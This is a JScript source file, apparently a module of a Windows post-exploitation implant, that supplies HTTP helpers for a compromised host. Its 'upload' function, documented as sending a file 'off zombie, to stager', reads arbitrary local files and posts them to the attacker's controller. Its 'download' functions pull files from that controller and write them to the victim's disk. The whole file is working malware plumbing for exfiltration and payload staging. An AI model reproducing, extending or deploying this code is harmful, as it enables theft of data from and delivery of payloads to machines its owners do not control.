////////////////////////////////////////////////////////////////////////
// HTTP API
////////////////////////////////////////////////////////////////////////

var LIB = require("lib/std");

exports.VERSIONINFO = "HTTP Lib (http.js) version 0.1";
exports.global = global;
exports.require = global.require;

exports.create = function() {
    var http = null;

    try {
        http = LIB.CreateObject("Microsoft.XMLHTTP");
    } catch (e) {
        http = LIB.CreateObject("WinHttp.WinHttpRequest.5.1");
        http.setTimeouts(30000, 30000, 30000, 0)
    }

    return http;
}

exports.addHeaders = function(http, headers) {
    var headers = (typeof(headers) !== "undefined") ? headers : {};

    var content = false;
    for (var key in headers) {
        var value = headers[key];

        http.setRequestHeader(key, value);
        if (key.toUpperCase() == "CONTENT-TYPE")
            content = true;
    }

    if (!content)
        http.setRequestHeader("Content-Type", "application/octet-stream");
};

exports.post = function(url, data, headers) {
    var data = (typeof(data) !== "undefined") ? data : "";

    var http = exports.create();

    http.open("POST", url, false);
    exports.addHeaders(http, headers);
    http.send(data);

    return http;
};

exports.get = function(url, headers) {
    var http = exports.create();
    http.open("GET", url, false);
    exports.addHeaders(http, headers);
    http.send();

    return http;
};

/**
 * Upload a file, off zombie, to stager
 *
 * @param filepath - the full path to the file to send
 * @param header_uuid - a unique identifier for this file
 * @param header_key - optional HTTP header tag to send uuid over
 *
 * @return object - the HTTP object
 *
 **/
exports.upload = function(filepath, header_uuid, header_key) {
    var key = (typeof(header_key) !== "undefined") ? header_key : "ETag";

    var data = $.file.readBinary(filepath);

    // we must replace null bytes or MS will cut off the body
    data = data.replace(/\\/g, "\\\\");
    data = data.replace(/\0/g, "\\0");

    var headers = {};
    headers[key] = header_uuid;

    return $.work.report(data, headers);
};

exports.download = function(filepath, header_uuid, header_key) {
    var key = (typeof(header_key) !== "undefined") ? header_key : "ETag";

    var headers = {};
    headers[key] = header_uuid;

    return exports.downloadEx("POST", $.work.make_url(), headers, filepath);
};

exports.downloadEx = function(verb, url, headers, path) {
    if (verb == "GET") {
        var http = exports.get(url, headers);
    } else {
        var http = exports.post(url, "", headers);
    }

    var stream = LIB.CreateObject("Adodb.Stream");
    stream.Type = 1;
    stream.Open();
    stream.Write(http.responseBody);

    var data = exports.bin2str(stream);
    $.file.write(path, data);
};

exports.bin2str = function(stream) {
    stream.Flush();
    stream.Position = 0;

    var bin = stream.Read();
    var rs = LIB.CreateObject("Adodb.RecordSet");
    rs.Fields.Append("temp", 201, stream.Size);

    rs.Open();
    rs.AddNew();
    rs("temp").AppendChunk(bin);
    rs.Update();
    var data = rs.GetString();
    rs.Close();
    return data.substring(0, data.length - 1);
};
